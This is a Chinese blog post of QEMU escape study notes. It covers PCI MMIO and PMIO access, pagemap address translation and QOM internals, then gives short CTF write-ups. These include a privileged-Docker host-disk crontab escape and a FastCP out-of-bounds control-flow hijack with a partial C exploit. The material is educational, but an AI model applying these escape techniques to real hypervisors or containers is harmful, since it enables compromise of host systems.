<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>Qemu逃逸学习记录</title><meta name="description" content="A person often meets his destiny on the road he took to avoid it."><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="pci设备地址空间PCI设备都有一个配置空间（PCI Configuration Space），其记录了关于此设备的详细信息。大小为256字节，其中头部64字节是PCI标准规定的，当然并非所有的项都必须填充，位置是固定了，没有用到可以填充0。前16个字节的格式是一定的，包含头部的类型、设备的总类、设备的性质以及制造商等，格式如下：

比较关键的是其6个BAR(Base Address Registers)，BAR记录了设备所需要的地址空间的类型，基址以及其他属性。BAR的格式如下：

设备可以申请两类地址空间，memory space和I/O space，它们用BAR的最后一位区别开来。
当BAR最后一位为0表示这是映射的I/O内存，为1是表示这是I/O端口，当是I/O内存的时候1-2位表示内存的类型，bi.."><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Q1IQ's blog" type="application/atom+xml">
</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Q1IQ's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Qemu逃逸学习记录</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#pci%E8%AE%BE%E5%A4%87%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4"><span class="toc-text">pci设备地址空间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu-%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2"><span class="toc-text">qemu 地址转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu%E4%B8%AD%E8%AE%BF%E9%97%AEI-O%E7%A9%BA%E9%97%B4-%E5%86%99exp%E7%9A%84%E6%97%B6%E5%80%99%E7%94%A8"><span class="toc-text">qemu中访问I&#x2F;O空间&#x2F;&#x2F;写exp的时候用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEmmio"><span class="toc-text">访问mmio</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEpmio"><span class="toc-text">访问pmio</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#QOM%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%9E%8B-%E9%80%86%E5%90%91%E7%9A%84%E6%97%B6%E5%80%99%E7%94%A8"><span class="toc-text">QOM编程模型&#x2F;&#x2F;逆向的时候用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2018Real-World-CTF-Vmware"><span class="toc-text">[2018Real World CTF-Vmware]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2019%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E5%85%B1%E6%B5%8B%E5%A4%A7%E8%B5%9B-docker-qemu-vmware"><span class="toc-text">[2019数字经济共测大赛 docker-qemu-vmware]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2020Geekpwn-qemu%E9%80%83%E9%80%B8-Vimu"><span class="toc-text">[2020Geekpwn-qemu逃逸-Vimu]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2021hws%E5%85%A5%E8%90%A5%E8%B5%9B-qemu%E9%80%83%E9%80%B8-FastCP"><span class="toc-text">[2021hws入营赛-qemu逃逸-FastCP]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/PWN"><i class="tag post-item-tag">PWN</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Qemu逃逸学习记录</h1><time class="has-text-grey" datetime="2020-08-25T16:16:48.000Z">2020-08-26</time><article class="mt-2 post-content"><h3 id="pci设备地址空间"><a href="#pci设备地址空间" class="headerlink" title="pci设备地址空间"></a>pci设备地址空间</h3><p>PCI设备都有一个配置空间（PCI Configuration Space），其记录了关于此设备的详细信息。大小为256字节，其中头部64字节是PCI标准规定的，当然并非所有的项都必须填充，位置是固定了，没有用到可以填充0。前16个字节的格式是一定的，包含头部的类型、设备的总类、设备的性质以及制造商等，格式如下：</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20211207235924.png"></p>
<p>比较关键的是其6个BAR(Base Address Registers)，BAR记录了设备所需要的地址空间的类型，基址以及其他属性。BAR的格式如下：</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20211208000106.png"></p>
<p>设备可以申请两类地址空间，memory space和I/O space，它们用BAR的最后一位区别开来。</p>
<p>当BAR最后一位为0表示这是映射的I/O内存，为1是表示这是I/O端口，当是I/O内存的时候1-2位表示内存的类型，bit 2为1表示采用64位地址，为0表示采用32位地址。bit1为1表示区间大小超过1M，为0表示不超过1M。bit3表示是否支持可预取。</p>
<p>而相对于I/O内存，当最后一位为1时表示映射的I/O端口。I/O端口一般不支持预取，所以这里是29位的地址。</p>
<p>通过memory space访问设备I/O的方式称为memory mapped I/O，即MMIO，这种情况下，CPU直接使用普通访存指令即可访问设备I/O。</p>
<p>通过I/O space访问设备I/O的方式称为port I/O，或者port mapped I/O，这种情况下CPU需要使用专门的I/O指令如IN/OUT访问I/O端口。</p>
<p>关于MMIO和PMIO，维基百科的描述是：</p>
<p>Memory-mapped I/O (MMIO) and port-mapped I/O (PMIO) (which is also called isolated I/O) are two complementary methods of performing input/output (I/O) between the central processing unit (CPU) and peripheral devices in a computer. An alternative approach is using dedicated I/O processors, commonly known as channels on mainframe computers, which execute their own instructions.</p>
<p>在MMIO中，内存和I/O设备共享同一个地址空间。 MMIO是应用得最为广泛的一种I/O方法，它使用相同的地址总线来处理内存和I/O设备，I/O设备的内存和寄存器被映射到与之相关联的地址。当CPU访问某个内存地址时，它可能是物理内存，也可以是某个I/O设备的内存，用于访问内存的CPU指令也可来访问I/O设备。每个I/O设备监视CPU的地址总线，一旦CPU访问分配给它的地址，它就做出响应，将数据总线连接到需要访问的设备硬件寄存器。为了容纳I/O设备，CPU必须预留给I/O一个地址区域，该地址区域不能给物理内存使用。</p>
<p>在PMIO中，内存和I/O设备有各自的地址空间。 端口映射I/O通常使用一种特殊的CPU指令，专门执行I/O操作。在Intel的微处理器中，使用的指令是IN和OUT。这些指令可以读/写1,2,4个字节（例如：outb, outw, outl）到IO设备上。I/O设备有一个与内存不同的地址空间，为了实现地址空间的隔离，要么在CPU物理接口上增加一个I/O引脚，要么增加一条专用的I/O总线。由于I/O地址空间与内存地址空间是隔离的，所以有时将PMIO称为被隔离的IO(Isolated I/O)。</p>
<p>lspci命令用于显示当前主机的所有PCI总线信息，以及所有已连接的PCI设备信息。</p>
<p>pci设备的寻址是由总线、设备以及功能构成。如下所示：</p>
<pre><code>ubuntu@ubuntu:~$ lspci
00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)
00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]
00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]
00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)
00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)
xx:yy:z的格式为总线:设备:功能的格式。</code></pre>
<p>其中00表示pci的域， PCI域最多可以承载256条总线。 每条总线最多可以有32个设备，每个设备最多可以有8个功能。</p>
<p>PCI 设备通过VendorIDs、DeviceIDs、以及Class Codes字段区分：</p>
<pre><code>ubuntu@ubuntu:~$ lspci -v -m -n -s 00:03.0
Device: 00:03.0
Class:  00ff
Vendor: 1234
Device: 11e9
SVendor:        1af4
SDevice:        1100
PhySlot:        3
Rev:    10

ubuntu@ubuntu:~$ lspci -v -m -s 00:03.0
Device: 00:03.0
Class:  Unclassified device [00ff]
Vendor: Vendor 1234
Device: Device 11e9
SVendor:        Red Hat, Inc
SDevice:        Device 1100
PhySlot:        3
Rev:    10</code></pre>
<p>也可通过查看其config文件来查看设备的配置空间，数据都可以匹配上，如前两个字节1234为vendor id：</p>
<pre><code>ubuntu@ubuntu:~$ hexdump /sys/devices/pci0000\:00/0000\:00\:03.0/config
0000000 1234 11e9 0103 0000 0010 00ff 0000 0000
0000010 1000 febf c051 0000 0000 0000 0000 0000
0000020 0000 0000 0000 0000 0000 0000 1af4 1100
0000030 0000 0000 0000 0000 0000 0000 0000 0000</code></pre>
<p>查看设备内存空间：</p>
<pre><code>ubuntu@ubuntu:~$ lspci -v -s 00:03.0 -x
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
        Subsystem: Red Hat, Inc Device 1100
        Physical Slot: 3
        Flags: fast devsel
        Memory at febf1000 (32-bit, non-prefetchable) [size=256]
        I/O ports at c050 [size=8]
00: 34 12 e9 11 03 01 00 00 10 00 ff 00 00 00 00 00
10: 00 10 bf fe 51 c0 00 00 00 00 00 00 00 00 00 00
20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11
30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</code></pre>
<p>可以看到该设备有两个空间：BAR0为MMIO空间，地址为febf1000，大小为256；BAR1为PMIO空间，端口地址为0xc050，大小为8。</p>
<p>可以通过查看resource文件来查看其相应的内存空间：</p>
<pre><code>ubuntu@ubuntu:~$ ls -la /sys/devices/pci0000\:00/0000\:00\:03.0/
...
-r--r--r--  1 root root 4096 Aug  1 03:40 resource
-rw-------  1 root root  256 Jul 31 13:18 resource0
-rw-------  1 root root    8 Aug  1 04:01 resource1
...</code></pre>
<p>resource文件包含其它相应空间的数据，如resource0（MMIO空间）以及resource1（PMIO空间）：</p>
<pre><code>ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource
0x00000000febf1000 0x00000000febf10ff 0x0000000000040200
0x000000000000c050 0x000000000000c057 0x0000000000040101
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000</code></pre>
<p>每行分别表示相应空间的起始地址（start-address）、结束地址（end-address）以及标识位（flags）。</p>
<h3 id="qemu-地址转换"><a href="#qemu-地址转换" class="headerlink" title="qemu 地址转换"></a>qemu 地址转换</h3><p>hva=base_hva+(gfn-base_gfn)*PAGE_SIZE</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;assert.h&gt;
#include &lt;inttypes.h&gt;

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)
#define PFN_PRESENT (1ull &lt;&lt; 63)
#define PFN_PFN     ((1ull &lt;&lt; 55) - 1)

int fd;

uint32_t page_offset(uint32_t addr)
&#123;
    return addr &amp; ((1 &lt;&lt; PAGE_SHIFT) - 1);
&#125;

uint64_t gva_to_gfn(void *addr)
&#123;
    uint64_t pme, gfn;
    size_t offset;
    offset = ((uintptr_t)addr &gt;&gt; 9) &amp; ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &amp;pme, 8);
    if (!(pme &amp; PFN_PRESENT))
        return -1;
    gfn = pme &amp; PFN_PFN;
    return gfn;
&#125;

uint64_t gva_to_gpa(void *addr)
&#123;
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn &lt;&lt; PAGE_SHIFT) | page_offset((uint64_t)addr);
&#125;

int main()
&#123;
    uint8_t *ptr;
    uint64_t ptr_mem;

    fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY);
    if (fd &lt; 0) &#123;
        perror(&quot;open&quot;);
        exit(1);
    &#125;

    ptr = malloc(256);
    strcpy(ptr, &quot;Where am I?&quot;);
    printf(&quot;%s\n&quot;, ptr);
    ptr_mem = gva_to_gpa(ptr);
    printf(&quot;Your physical address is at 0x%&quot;PRIx64&quot;\n&quot;, ptr_mem);

    getchar();
    return 0;
&#125;</code></pre>
<h3 id="qemu中访问I-O空间-写exp的时候用"><a href="#qemu中访问I-O空间-写exp的时候用" class="headerlink" title="qemu中访问I/O空间//写exp的时候用"></a>qemu中访问I/O空间//写exp的时候用</h3><p>存在mmio与pmio，那么在系统中该如何访问这两个空间呢？访问mmio与pmio都可以采用在内核态访问或在用户空间编程进行访问。</p>
<h4 id="访问mmio"><a href="#访问mmio" class="headerlink" title="访问mmio"></a>访问mmio</h4><p>编译内核模块，在内核态访问mmio空间，示例代码如下：</p>
<pre><code>#include &lt;asm/io.h&gt;
#include &lt;linux/ioport.h&gt;

long addr=ioremap(ioaddr,iomemsize);
readb(addr);
readw(addr);
readl(addr);
readq(addr);//qwords=8 btyes

writeb(val,addr);
writew(val,addr);
writel(val,addr);
writeq(val,addr);
iounmap(addr);</code></pre>
<p>还有一种方式是在用户态访问mmio空间，通过映射resource0文件实现内存的访问，示例代码如下：</p>
<pre><code>#include &lt;assert.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;inttypes.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
#include&lt;sys/io.h&gt;
unsigned char* mmio_mem;
void die(const char* msg)
&#123;
    perror(msg);
    exit(-1);
&#125;

void mmio_write(uint32_t addr, uint32_t value)
&#123;
    *((uint32_t*)(mmio_mem + addr)) = value;
&#125;
uint32_t mmio_read(uint32_t addr)
&#123;
    return *((uint32_t*)(mmio_mem + addr));
&#125;
int main(int argc, char *argv[])
&#123;

    // Open and map I/O memory for the strng device
    int mmio_fd = open(&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;, O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die(&quot;mmio_fd open failed&quot;);

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die(&quot;mmap mmio_mem failed&quot;);

    printf(&quot;mmio_mem @ %p\n&quot;, mmio_mem);

    mmio_read(0x128);
        mmio_write(0x128, 1337);

&#125;</code></pre>
<h4 id="访问pmio"><a href="#访问pmio" class="headerlink" title="访问pmio"></a>访问pmio</h4><p>编译内核模块，在内核空间访问pmio空间，示例代码如下：</p>
<pre><code>#include &lt;asm/io.h&gt; 
#include &lt;linux/ioport.h&gt;

inb(port);  //读取一字节
inw(port);  //读取两字节
inl(port);  //读取四字节

outb(val,port); //写一字节
outw(val,port); //写两字节
outl(val,port); //写四字节</code></pre>
<p>用户空间访问则需要先调用iopl函数申请访问端口，示例代码如下：</p>
<pre><code>#include &lt;sys/io.h &gt;

iopl(3); 
inb(port); 
inw(port); 
inl(port);

outb(val,port); 
outw(val,port); 
outl(val,port);</code></pre>
<h3 id="QOM编程模型-逆向的时候用"><a href="#QOM编程模型-逆向的时候用" class="headerlink" title="QOM编程模型//逆向的时候用"></a>QOM编程模型//逆向的时候用</h3><p>通过QOM对象来实现一个PCI设备，实现其相应的PMIO以及MMIO等，一般出题都是这么出的。</p>
<p>QEMU提供了一套面向对象编程的模型——QOM（QEMU Object Module），几乎所有的设备如CPU、内存、总线等都是利用这一面向对象的模型来实现的。</p>
<p>由于qemu模拟设备以及CPU等，既有相应的共性又有自己的特性，因此使用面向对象来实现相应的程序是非常高效的，可以像理解C++或其它面向对象语言来理解QOM。</p>
<p>有几个比较关键的结构体，TypeInfo、TypeImpl、ObjectClass以及Object。其中ObjectClass、Object、TypeInfo定义在include/qom/object.h中，TypeImpl定义在qom/object.c中。</p>
<p>TypeInfo是用户用来定义一个Type的数据结构，用户定义了一个TypeInfo，然后调用type_register(TypeInfo )或者type_register_static(TypeInfo )函数，就会生成相应的TypeImpl实例，将这个TypeInfo注册到全局的TypeImpl的hash表中。</p>
<pre><code>struct TypeInfo
&#123;
    const char *name;
    const char *parent;
    size_t instance_size;
    void (*instance_init)(Object *obj);
    void (*instance_post_init)(Object *obj);
    void (*instance_finalize)(Object *obj);
    bool abstract;
    size_t class_size;
    void (*class_init)(ObjectClass *klass, void *data);
    void (*class_base_init)(ObjectClass *klass, void *data);
    void (*class_finalize)(ObjectClass *klass, void *data);
    void *class_data;
    InterfaceInfo *interfaces;
&#125;;</code></pre>
<p>TypeImpl的属性与TypeInfo的属性对应，实际上qemu就是通过用户提供的TypeInfo创建的TypeImpl的对象。</p>
<p>如下面定义的pci_test_dev：</p>
<pre><code>static const TypeInfo pci_testdev_info = &#123;
        .name          = TYPE_PCI_TEST_DEV,
        .parent        = TYPE_PCI_DEVICE,
        .instance_size = sizeof(PCITestDevState),
        .class_init    = pci_testdev_class_init,
&#125;;
TypeImpl *type_register_static(const TypeInfo *info)
&#123;
    return type_register(info);
&#125;
TypeImpl *type_register(const TypeInfo *info)
&#123;
    assert(info-&gt;parent);
    return type_register_internal(info);
&#125;
static TypeImpl *type_register_internal(const TypeInfo *info)
&#123;
    TypeImpl *ti;
    ti = type_new(info);
    type_table_add(ti);
    return ti;
&#125;</code></pre>
<p>当所有qemu总线、设备等的type_register_static执行完成后，即它们的TypeImpl实例创建成功后，qemu就会在type_initialize函数中去实例化其对应的ObjectClasses。</p>
<p>每个type都有一个相应的ObjectClass所对应，其中ObjectClass是所有类的基类</p>
<pre><code>struct ObjectClass
&#123;
    /*&lt; private &gt;*/
    Type type;  
    GSList *interfaces;
    const char *object_cast_cache[OBJECT_CLASS_CAST_CACHE];
    const char *class_cast_cache[OBJECT_CLASS_CAST_CACHE];
    ObjectUnparent *unparent;
    GHashTable *properties;
&#125;;</code></pre>
<p>用户可以定义自己的类，继承相应类即可：</p>
<pre><code>/* include/qom/object.h */
typedef struct TypeImpl *Type;
typedef struct ObjectClass ObjectClass;
struct ObjectClass
&#123;
        /*&lt; private &gt;*/
        Type type;       /* points to the current Type&#39;s instance */
        ...
/* include/hw/qdev-core.h */
typedef struct DeviceClass &#123;
        /*&lt; private &gt;*/
        ObjectClass parent_class;
        /*&lt; public &gt;*/
        ...
/* include/hw/pci/pci.h */
typedef struct PCIDeviceClass &#123;
        DeviceClass parent_class;
        ...</code></pre>
<p>可以看到类的定义中父类都在第一个字段，使得可以父类与子类直接实现转换。一个类初始化时会先初始化它的父类，父类初始化完成后，会将相应的字段拷贝至子类同时将子类其余字段赋值为0，再进一步赋值。同时也会继承父类相应的虚函数指针，当所有的父类都初始化结束后，TypeInfo::class_init就会调用以实现虚函数的初始化，如下例的pci_testdev_class_init所示：</p>
<pre><code>static void pci_testdev_class_init(ObjectClass *klass, void *data)
&#123;
        DeviceClass *dc = DEVICE_CLASS(klass);
        PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);
        k-&gt;init = pci_testdev_init;
        k-&gt;exit = pci_testdev_uninit;
        ...
        dc-&gt;desc = &quot;PCI Test Device&quot;;
        ...
&#125;</code></pre>
<p>最后一个是Object对象：</p>
<pre><code>struct Object
&#123;
    /*&lt; private &gt;*/
    ObjectClass *class;
    ObjectFree *free;
    GHashTable *properties;
    uint32_t ref;
    Object *parent;
&#125;;</code></pre>
<p>Object对象为何物？Type以及ObjectClass只是一个类型，而不是具体的设备。TypeInfo结构体中有两个函数指针：instance_init以及class_init。class_init是负责初始化ObjectClass结构体的，instance_init则是负责初始化具体Object结构体的。</p>
<p>the Object constructor and destructor functions (registered by the respective Objectclass constructors) will now only get called if the corresponding PCI device’s -device option was specified on the QEMU command line (unless, probably, it is a default PCI device for the machine).  Object类的构造函数与析构函数（在Objectclass构造函数中注册的）只有在命令中-device指定加载该设备后才会调用（或者它是该系统的默认加载PCI设备）。</p>
<p>Object示例如下所示：</p>
<pre><code>/* include/qom/object.h */
typedef struct Object Object;
struct Object
&#123;
        /*&lt; private &gt;*/
        ObjectClass *class; /* points to the Type&#39;s ObjectClass instance */
        ...
/* include/qemu/typedefs.h */
typedef struct DeviceState DeviceState;
typedef struct PCIDevice PCIDevice;
/* include/hw/qdev-core.h */
struct DeviceState &#123;
        /*&lt; private &gt;*/
        Object parent_obj;
        /*&lt; public &gt;*/
        ...
/* include/hw/pci/pci.h */
struct PCIDevice &#123;
        DeviceState qdev;
        ...
struct YourDeviceState&#123;
        PCIDevice pdev;
        ...
</code></pre>
<p>（QOM will use instace_size as the size to allocate a Device Object, and then it invokes the instance_init ）<br>QOM会为设备Object分配instace_size大小的空间，然后调用instance_init函数（在Objectclass的class_init函数中定义）：</p>
<pre><code>static int pci_testdev_init(PCIDevice *pci_dev)
&#123;
        PCITestDevState *d = PCI_TEST_DEV(pci_dev);
        ...


</code></pre>
<p>最后便是PCI的内存空间了，qemu使用MemoryRegion来表示内存空间，在include/exec/memory.h中定义。使用MemoryRegionOps结构体来对内存的操作进行表示，如PMIO或MMIO。对每个PMIO或MMIO操作都需要相应的MemoryRegionOps结构体，该结构体包含相应的read/write回调函数。</p>
<pre><code>static const MemoryRegionOps pci_testdev_mmio_ops = &#123;
        .read = pci_testdev_read,
        .write = pci_testdev_mmio_write,
        .endianness = DEVICE_LITTLE_ENDIAN,
        .impl = &#123;
                .min_access_size = 1,
                .max_access_size = 1,
        &#125;,
&#125;;

static const MemoryRegionOps pci_testdev_pio_ops = &#123;
        .read = pci_testdev_read,
        .write = pci_testdev_pio_write,
        .endianness = DEVICE_LITTLE_ENDIAN,
        .impl = &#123;
                .min_access_size = 1,
                .max_access_size = 1,
        &#125;,
&#125;;</code></pre>
<p>首先使用memory_region_init_io函数初始化内存空间（MemoryRegion结构体），记录空间大小，注册相应的读写函数等；然后调用pci_register_bar来注册BAR等信息。需要指出的是无论是MMIO还是PMIO，其所对应的空间需要显示的指出（即静态声明或者是动态分配），因为memory_region_init_io只是记录空间大小而并不分配。</p>
<pre><code>/* hw/misc/pci-testdev.c */
#define IOTEST_IOSIZE 128
#define IOTEST_MEMSIZE 2048

typedef struct PCITestDevState &#123;
        /*&lt; private &gt;*/
        PCIDevice parent_obj;
        /*&lt; public &gt;*/

        MemoryRegion mmio;
        MemoryRegion portio;
        IOTest *tests;
        int current;
&#125; PCITestDevState;

static int pci_testdev_init(PCIDevice *pci_dev)
&#123;
        PCITestDevState *d = PCI_TEST_DEV(pci_dev);
        ...
        memory_region_init_io(&amp;d-&gt;mmio, OBJECT(d), &amp;pci_testdev_mmio_ops, d,
                                                    &quot;pci-testdev-mmio&quot;, IOTEST_MEMSIZE * 2); 
        memory_region_init_io(&amp;d-&gt;portio, OBJECT(d), &amp;pci_testdev_pio_ops, d,
                                                    &quot;pci-testdev-portio&quot;, IOTEST_IOSIZE * 2); 
        pci_register_bar(pci_dev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;d-&gt;mmio);
        pci_register_bar(pci_dev, 1, PCI_BASE_ADDRESS_SPACE_IO, &amp;d-&gt;portio);</code></pre>
<h3 id="2018Real-World-CTF-Vmware"><a href="#2018Real-World-CTF-Vmware" class="headerlink" title="[2018Real World CTF-Vmware]"></a>[2018Real World CTF-Vmware]</h3><p>vmware中guest机和host机通信的方法是通过对guest用户态的 in / out 564D5868h 软中断的处理来完成的（这在vmware中被称为backdoor接口）</p>
<p>这个题目的漏洞点就在这个软中断的处理中，题目patch了正常逻辑，通过二进制比对找到patch的地方即可定位漏洞点</p>
<p>逆向分析</p>
<p>漏洞类型：double free</p>
<h3 id="2019数字经济共测大赛-docker-qemu-vmware"><a href="#2019数字经济共测大赛-docker-qemu-vmware" class="headerlink" title="[2019数字经济共测大赛 docker-qemu-vmware]"></a>[2019数字经济共测大赛 docker-qemu-vmware]</h3><p>docker insmod了带漏洞的ko，简单逻辑逆向</p>
<p>​      非预期 docker带privileged时权限和宿主机root基本一样，mount /dev/sda1 /xyz可访问宿主机硬盘，只需要在/etc/crontab中加一行，注意display=:0</p>
<pre><code>* * * * * b DISPLAY=:0 /usr/bin/gnome-calculator</code></pre>
<p>qemu 简单逻辑逆向</p>
<p>vmware  和[2018Real World CTF-Vmware]基本一样，题目patch了正常逻辑留了后门，二进制比对定位漏洞点</p>
<p>漏洞类型：后门</p>
<h3 id="2020Geekpwn-qemu逃逸-Vimu"><a href="#2020Geekpwn-qemu逃逸-Vimu" class="headerlink" title="[2020Geekpwn-qemu逃逸-Vimu]"></a>[2020Geekpwn-qemu逃逸-Vimu]</h3><p>double free漏洞，可以任意free一个mmap到的地址，然后就是多线程堆利用</p>
<p>qemu被strip去符号，（设备vin相关的函数给提取出来才能进一步分析，搜索特征字符串然后对比着<a target="_blank" rel="noopener" href="https://github.com/qemu/qemu/blob/master/hw/misc/edu.c">edu.c</a>源码提取出的函数）</p>
<h3 id="2021hws入营赛-qemu逃逸-FastCP"><a href="#2021hws入营赛-qemu逃逸-FastCP" class="headerlink" title="[2021hws入营赛-qemu逃逸-FastCP]"></a>[2021hws入营赛-qemu逃逸-FastCP]</h3><p>mmio的write注册了timer，timer有写地址addr1任意长度功能和一个复制addr1到addr2任意长度功能，越界addr2 0x1000的地方有函数指针和这个函数的参数指针能直接劫持控制流，但是qemu内部的物理页大小是0x1000，写入超过0x1000的数据就会被隔断，因此分配到两个连续的物理页即可。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20210824104510.png"></p>
<p>write中有个timer，cmd=1的时候有越界读写，cmd=4的时候有越界读，其他的都在注释里了，然后就是常规的泄漏地址和system(“/bin/sh”)。</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;

#define PAGE_SIZE 0x1000

uint64_t base = 0;
int pm = 0;

int mmio_read(uint64_t addr)
&#123;
    return *((uint64_t *)(base + addr));
&#125;

void mmio_write(uint64_t addr, uint64_t value)
&#123;
    *((uint64_t *)(base + addr)) = value;
&#125;

uint32_t v2p(void *addr)
&#123;
    uint32_t index = (uint64_t)addr / PAGE_SIZE;
    lseek(pm, index * 8, SEEK_SET);
    uint64_t num = 0;
    read(pm, &amp;num, 8);
    return ((num &amp; (((uint64_t)1 &lt;&lt; 55) - 1)) &lt;&lt; 12) + (uint64_t)addr % PAGE_SIZE;
&#125;

void bubble_sort(int arr[], int len)
&#123;
    int i, j, temp;
    for (i = 0; i &lt; len - 1; i++)
        for (j = 0; j &lt; len - 1 - i; j++)
            if (arr[j] &gt; arr[j + 1])
            &#123;
                temp = arr[j];
                arr[j] = arr[j + 1];
                arr[j + 1] = temp;
            &#125;
&#125;

int main()
&#123;
    //puts(&quot;[*]exploit exp1&quot;);
    int fd = open(&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;, O_RDWR | O_SYNC);
    assert(fd != -1);

    base = (uint64_t)mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    assert(base != -1);

    pm = open(&quot;/proc/self/pagemap&quot;, O_RDONLY);
    assert(pm != -1);

    /* 
    mmio_write(8,2)   //opaque-&gt;cp_state.CP_list_src = val;
    mmio_write(16,1) //opaque-&gt;cp_state.CP_list_cnt = val;
    mmio_write(24,1)//opaque-&gt;cp_state.cmd = val; //timer
    read
    opaque-&gt;handling;                  // addr==0
    opaque-&gt;cp_state.CP_list_src;        // addr==8
    opaque-&gt;cp_state.CP_list_cnt;          // addr==16
    opaque-&gt;cp_state.cmd;              // addr==24

    CP_src
     CP_cnt   
     CP_dst
            cmd=2
     / src -&gt;  buf1fer
     cmd=4
     / buf1fer-&gt;dst
*/

    void *addr[] = &#123;malloc(0x1000), malloc(0x1000), malloc(0x1000), malloc(0x1000), malloc(0x1000), malloc(0x1000)&#125;;
